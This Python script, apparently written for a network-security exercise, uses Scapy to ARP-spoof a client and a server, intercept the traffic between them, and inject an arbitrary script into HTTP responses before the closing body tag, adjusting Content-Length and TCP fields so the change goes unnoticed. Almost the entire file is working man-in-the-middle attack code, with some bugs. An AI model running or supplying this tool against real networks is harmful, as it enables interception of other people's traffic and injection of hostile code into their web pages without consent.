# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
# https://scapy.net/conf/scapy_hack.lu.pdf
# https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/sending_recieving/index.html
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    try:
        yes,no = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),verbose=False,timeout=8)
        for r in yes:
            x,y = r
            return y[ARP].hwsrc
    except:
        debug("Error resolving MAC for {}".format(IP))
        return ""

# Helper function
def makeARP(dst,src,hw_src,hw_dst,gw="ff:ff:ff:ff:ff:ff"):
    return ARP(op=2,pdst=dst,psrc=src,hwdst=hw_dst,hwsrc=hw_src)

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP,attackerMAC,clientIP,clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP,attackerMAC,serverIP,serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    # configuring layer 2 
    spoofed = Ether(src=srcMAC,dst=dstMAC)/makeARP(dstIP,srcIP,srcMAC,dstMAC)
    sendp(spoofed.build())


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(makeARP(dstIP,srcIP,srcMAC,dstMAC))

# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
from scapy.layers.http import *
def forward(packet):
    global clientMAC, clientIP, serverMAC, \
      serverIP, attackerIP, attackerMAC,sessions

    if packet.haslayer(TCP):
        sess_id = tuple((packet[TCP].dport,packet[TCP].sport))
    # Change the layer 2 routing information of the packet
    if packet.haslayer(Ether) \
      and packet[Ether].src == attackerMAC:
        del packet
        pass
    # Packet forwarded to client
    if packet.haslayer(IP) and packet[IP].dst == clientIP:
        packet[Ether].dst = clientMAC
        packet[Ether].src = attackerMAC
    # Packet forwarded to server
    elif packet.haslayer(IP) and packet[IP].dst == serverIP:
        packet[Ether].dst = serverMAC
        packet[Ether].src = attackerMAC
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            packet[TCP].ack -= payload_len
    try:
        if packet.haslayer(TCP) and packet[TCP].flags == "FA":
            sendp(Ether(packet.build()))
            if sess_id in sessions:
                sessions.remove(sess_id)
        else:
            sendp(Ether(packet.build())) 
    except Exception as e:
        debug('#Caught Exception: {}'.format(e))
        debug('#Fragmenting packet...')
        # Tell TCP to resend sliding window
        n_bytes = len(packet[IP]) - len(packet[Raw])
        inc1 = len(packet[Raw].load)-n_bytes
        packet[Raw].load = packet[Raw].load[:n_bytes]
        del(packet[IP].ttl)
        packet[TCP].flags = "A"
        sendp(Ether(packet.build()))
        packet[Raw].load = packet[Raw].load[n_bytes:]
        packet[TCP].ack = packet[TCP].seq+n_bytes
        packet[TCP].seq = packet[TCP].ack+inc1
        #packet[TCP].flags = "FA"
        del(packet[IP].ttl)
        sendp(Ether(packet.build()))
        del packet
        pass
class fakePacket:
    def __init__(self,packet):
        self.has_ether = 0
        self.has_ip = 0
        self.has_tcp = 0
        self.has_http = 0
        self.has_http_resp = 0
        self.has_http_req = 0
        self.has_raw = 0
        if packet.haslayer(Ether):
            self.ether_fields = packet[Ether].fields
            self.has_ether |= 1
        if packet.haslayer(IP):
            self.ip_fields = packet[IP].fields
            self.has_ip |= 1
        if packet.haslayer(TCP):
            self.tcp_fields = packet[TCP].fields
            self.has_tcp |= 1
        if packet.haslayer(HTTP):
            self.http_fields = packet[HTTP].fields
            self.has_http |= 1
        if packet.haslayer(HTTPResponse):
            self.http_resp_fields = packet[HTTPResponse].fields
            self.has_http_resp |= 1
        elif packet.haslayer(HTTPRequest):
            self.http_req_fields = packet[HTTPRequest].fields
            self.has_http_req |= 1 
        if packet.haslayer(Raw):
            self.raw_fields = packet[Raw].fields
            self.has_raw |= 1
    def build(self):
        self.ether_layer = Ether()
        self.ip_layer = IP()
        self.tcp_layer = TCP()
        self.http_layer = HTTP()
        self.http_resp_layer = HTTPResponse()
        self.http_req_layer = HTTPRequest()
        self.raw_layer = Raw()
        try:
            if self.has_ether > 0:
                ether_keys = [e for e in self.ether_fields.keys()]
                for e in ether_keys:
                    self.ether_layer.setfieldval(e,self.ether_fields[e])
            if self.has_ip > 0:
                ip_keys = [e for e in self.ip_fields.keys()]
                [self.ip_layer.setfieldval(e,self.ip_fields[e])\
                  for e in ip_keys] 
            if self.has_tcp > 0:
                tcp_keys = [e for e in self.tcp_fields.keys()]
                [self.tcp_layer.setfieldval(e,self.tcp_fields[e])\
                  for e in tcp_keys ]
            if self.has_http > 0:
                http_keys = [e for e in self.http_fields.keys()]
                [self.http_layer.setfieldval(e, self.http_fields[e])\
                  for e in http_keys]
            if self.has_http_resp > 0:
                http_keys = [e for e in self.http_resp_fields.keys()]
                [self.http_resp_layer.setfieldval(e,self.http_resp_fields[e])\
                  for e in http_keys]
            if self.has_http_req:
                http_keys = [e for e in self.http_req_fields.keys()]
                [self.http_req_layer.setfieldval(e,self.http_req_fields[e])\
                  for e in http_keys]
            if self.has_raw:
                raw_keys = [e for e in self.raw_fields.keys()]
                [self.raw_layer.setfieldval(e,self.raw_fields[e])\
                  for e in raw_keys]
            if self.has_http_resp > 0 and self.has_raw > 0:
                spoofed = self.ether_layer/self.ip_layer/self.tcp_layer/self.http_layer/self.http_resp_layer/self.raw_layer
            elif self.has_http_req > 0 and self.has_raw > 0: 
                spoofed = self.ether_layer/self.ip_layer/self.tcp_layer/self.http_layer/self.http_req_layer/self.raw_layer
            elif self.has_http > 0 and self.has_raw > 0:
                spoofed = self.ether_layer/self.ip_layer/self.tcp_layer/self.http_layer/self.raw_layer
            elif self.has_http > 0:
                spoofed = self.ether_layer/self.ip_layer/self.tcp_layer/self.http_layer/self.raw_layer
            elif self.has_raw > 0:
                spoofed = self.ether_layer/self.ip_layer/self.tcp_layer/self.http_layer/self.raw_layer
            else:
                spoofed = self.ehter_layer/self.ip_layer/self.tcp_layer
            return spoofed
        except Exception as e:
            print('err in build(): {}'.format(e))
            pass
sessions = []
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC,\
	  script, sessions,payload_len
    if packet[Ether].src == attackerMAC:
        return
    if packet.haslayer(TCP):
        sess_id = tuple((packet[TCP].dport,packet[TCP].sport))
        if packet[TCP].dport == 80 and sess_id not in sessions:
            sessions.append(tuple((packet[TCP].sport,packet[TCP].dport)))
            forward(packet)
            return
        try:
            if sess_id not in sessions and packet[IP].src == serverIP:
                sessions.append(sess_id)
            if packet.haslayer(HTTP) \
              and sess_id in sessions:
                if packet.haslayer(Raw) and b'</body>'\
                  in packet[Raw].load and script not \
                    in packet[Raw].load:
                    spoofed = fakePacket(packet.copy())
                    new_body = spoofed.raw_fields['load'].split(b'</body>')
                    new_body = b''.join([e for e in new_body[:-1]+[script]+new_body[-1:]])
                    spoofed.raw_fields['load'] = new_body
                    if spoofed.has_http_resp > 0:
                        spoofed.http_resp_fields['Content_Length'] = str(int(packet[HTTPResponse].Content_Length.decode()) + payload_len-len('</body>')).encode()
                    faked = spoofed.build()
                    del faked[IP].chksum 
                    del faked[IP].len
                    del faked[TCP].chksum
                    faked[TCP].flags = "FA"
                    forward(faked)
                elif packet.haslayer(HTTPResponse):
                    spoofed = fakePacket(packet.copy())
                    if spoofed.has_http_resp > 0:
                        spoofed.http_resp_fields['Content_Length'] = str(int(packet[HTTPResponse].Content_Length.decode()) + payload_len-len('</body>')).encode()
                    if spoofed.has_raw > 0 and b'</body>'\
                      in packet[Raw].load:
                          pass
                    faked = spoofed.build()
                    del faked[IP].chksum 
                    del faked[IP].len
                    del faked[TCP].chksum
                    forward(faked)
            else:
                forward(packet)
        except Exception as e:
            debug('err: {}'.format(e))
            pass
    else:
        forward(packet)
if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface
    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)
    script = args.script
    if script.startswith('<script>') == False:
        script = '<script>'+script
    if script.endswith('</script>') == False:
        script = script + '</script>'
    if script.endswith('</body>') == False:
        script += '</body>'
    payload_len = len(script)
    script = script.encode()
    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
